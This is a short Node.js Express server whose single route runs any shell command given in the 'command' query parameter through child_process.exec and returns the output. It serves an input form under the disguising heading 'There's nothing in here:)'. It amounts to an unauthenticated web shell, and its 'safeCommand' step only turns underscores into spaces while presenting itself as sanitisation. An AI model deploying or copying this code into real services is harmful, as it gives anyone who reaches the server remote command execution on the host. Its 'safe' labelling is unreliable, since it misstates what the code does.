const express = require('express');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const ansiHTML = require('ansi-html');

const app = express();
const port = 8100;

app.get('/', (req, res) => {
  const command = req.query.command;

  if (!command) {
    return res.send(`
      <h1>There's nothing in here:)</h1>
      <form method="GET">
        <input type="text" name="command" placeholder="Enter command">
        <button type="submit">Execute</button>
      </form>
    `);
  }

  // Replace underscores with spaces
  const safeCommand = command.replace(/_/g, ' ');

  exec(safeCommand)
    .then((result) => {
      const htmlOutput = ansiHTML(result.stdout + result.stderr);
      res.send(htmlOutput);
    })
    .catch((error) => {
      res.send(`Error: ${error.message}`);
    });
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
